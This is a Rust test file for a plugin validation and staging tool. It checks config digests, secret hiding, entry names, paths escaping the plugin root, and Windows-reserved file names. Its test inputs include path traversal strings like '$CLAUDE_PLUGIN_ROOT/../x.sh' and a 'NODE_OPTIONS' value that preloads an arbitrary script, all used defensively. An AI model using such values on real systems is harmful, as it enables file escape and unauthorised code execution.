        fx.write("hooks/hooks.json", serde_json::json!({"hooks": {event: [{"matcher": matcher, "hooks": [{"type": "command", "command": "x"}]}]}}).to_string());
        digest(&fx.check())
    };
    let d1 = hook("PreToolUse", "Bash");
    assert_ne!(hook("PostToolUse", "Bash"), d1);
    assert_ne!(hook("PreToolUse", "*"), d1);
    assert_eq!(hook("PreToolUse", "Bash"), d1);
}

#[test]
fn server_fields_are_in_the_digest_and_env_values_are_not_shown() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    let base = serde_json::json!({"type": "stdio", "command": "node", "args": ["s.js"], "cwd": "/tmp", "url": "u",
        "headers": {"H": "hv"}, "env": {"NODE_OPTIONS": "secret-value"}});
    let with = |k: &str, v: serde_json::Value| {
        let mut s = base.clone();
        s[k] = v;
        fx.write(".mcp.json", serde_json::json!({"mcpServers": {"s": s}}).to_string());
        fx.check()
    };
    let r = with("type", "stdio".into());
    let d1 = digest(&r);
    let out = r.render();
    assert!(out.contains("NODE_OPTIONS") && !out.contains("secret-value"), "{out}");
    for (k, v) in [("type", serde_json::json!("sse")), ("command", "deno".into()), ("args", serde_json::json!(["t.js"])),
                   ("cwd", "/".into()), ("url", "v".into()), ("headers", serde_json::json!({"G": "hv"})),
                   ("env", serde_json::json!({"OTHER": "secret-value"})), ("env", serde_json::json!({"NODE_OPTIONS": "--require /tmp/e.js"}))] {
        assert_ne!(digest(&with(k, v.clone())), d1, "{k} {v}");
    }
}

// Item 7: marketplace entry names

#[test]
fn marketplace_entry_names_are_checked() {
    let fx = Fx::new();
    market(&fx, r#"{"name":"Evil_Name/../x","source":"./p/a"},{"name":"other","source":"./p/b"},
                   {"name":"dup","source":"./p/c"},{"name":"dup","source":"./p/d"},{"name":"good","source":"./p/e"}"#);
    plugin(&fx, "p/a", "evil", "1.0.0");
    plugin(&fx, "p/b", "demo", "1.0.0");
    plugin(&fx, "p/c", "dup", "1.0.0");
    plugin(&fx, "p/d", "dup", "1.0.0");
    plugin(&fx, "p/e", "good", "1.0.0");
    let r = fx.check();
    assert!(r.violations.is_empty(), "{}", r.render());
    let got: Vec<(String, Vec<Rule>)> = r.plugins.iter().map(|p| (p.name.clone(), p.violations.iter().map(|v| v.rule).collect())).collect();
    assert_eq!(got, vec![
        ("evil".to_string(), vec![Rule::BadName, Rule::BadName]),
        ("demo".to_string(), vec![Rule::BadName]),
        ("dup".to_string(), vec![Rule::BadName]),
        ("dup".to_string(), vec![Rule::BadName]),
        ("good".to_string(), vec![]),
    ]);
}

// Item 8: root variable forms

#[test]
fn plugin_root_forms_outside_are_refused() {
    for cmd in ["$CLAUDE_PLUGIN_ROOT/../x.sh", "\"${CLAUDE_PLUGIN_ROOT}\"/../x.sh", "bash \"$CLAUDE_PLUGIN_ROOT/../x.sh\"", "'${CLAUDE_PLUGIN_ROOT}/a/../../x'"] {
        let fx = Fx::new();
        plugin(&fx, "", "demo", "1.0.0");
        fx.write("hooks/hooks.json", hooks_json(cmd));
        assert_eq!(rules(&fx.check()), vec![Rule::PathOutside], "{cmd}");
    }
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write(".mcp.json", r#"{"mcpServers":{"s":{"command":"node","args":["$CLAUDE_PLUGIN_ROOT/../x.js"]}}}"#);
    assert_eq!(rules(&fx.check()), vec![Rule::PathOutside]);
}

// Item 9: copied directory names are matched byte-exactly

#[test]
fn part_names_are_case_exact() {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write("Scripts/run.txt", "echo hi\n");
    fx.write("Hooks/hooks.json", hooks_json("echo x"));
    let r = fx.check();
    assert!(r.ok(), "{}", r.render());
    assert_eq!(r.plugins[0].copied, vec![".claude-plugin/plugin.json", "skills/hello/SKILL.md"]);
    assert!(r.plugins[0].code.is_empty());
}

// N47: Windows-unsafe plugin paths

fn n47(rel: &str, body: &str) -> (CheckReport, Result<zygo_plugins::store::Staged, Violation>) {
    let fx = Fx::new();
    plugin(&fx, "", "demo", "1.0.0");
    fx.write(rel, body);
    let r = fx.check();
    let store = Fx::new();
    let copied = [".claude-plugin/plugin.json".to_string(), rel.to_string()];
    let s = zygo_plugins::store::stage(&store.0, "team", &fx.0, &copied, &std::collections::HashMap::new(),
        std::time::Instant::now() + std::time::Duration::from_secs(5));
    (r, s)
}

fn unsafe_rel_is_refused(rel: &str, body: &str) {
    let (r, s) = n47(rel, body);
    assert_eq!(rules(&r), vec![Rule::PathOutside], "{rel}: {}", r.render());
    assert_eq!(s.expect_err("stage refuses").rule, Rule::PathOutside, "{rel}");
}

#[test]
fn windows_unsafe_dir_con() { unsafe_rel_is_refused("skills/con/SKILL.md", "---\nname: con\ndescription: Demo\n---\nx\n"); }
#[test]
fn windows_unsafe_nul_txt() { unsafe_rel_is_refused("skills/hello/NUL.txt", "x\n"); }
#[test]
fn windows_unsafe_aux() { unsafe_rel_is_refused("skills/hello/aux", "x\n"); }
#[test]
fn windows_unsafe_com1_md() { unsafe_rel_is_refused("skills/hello/com1.md", "x\n"); }
#[test]
fn windows_unsafe_lpt9() { unsafe_rel_is_refused("skills/hello/LPT9", "x\n"); }
#[test]
#[cfg_attr(windows, ignore = "NTFS writes x:s as stream s of file x: the name cannot exist on a Windows disk")]
fn windows_unsafe_colon() { unsafe_rel_is_refused("skills/hello/x:s", "x\n"); }
#[test]
fn windows_unsafe_control_console_md() {
    let (r, s) = n47("skills/hello/console.md", "x\n");
    assert!(r.ok(), "{}", r.render());
    assert!(s.is_ok());
}
#[test]
fn windows_unsafe_control_non_ascii_four_byte_stem() {
    // "co" + U+00E9 is 4 bytes with a char boundary at 2 and 4, not 3: the check must not slice it at byte 3.
    let (r, s) = n47("skills/hello/co\u{e9}.md", "x\n");
    assert!(r.ok(), "{}", r.render());
    assert!(s.is_ok());
}
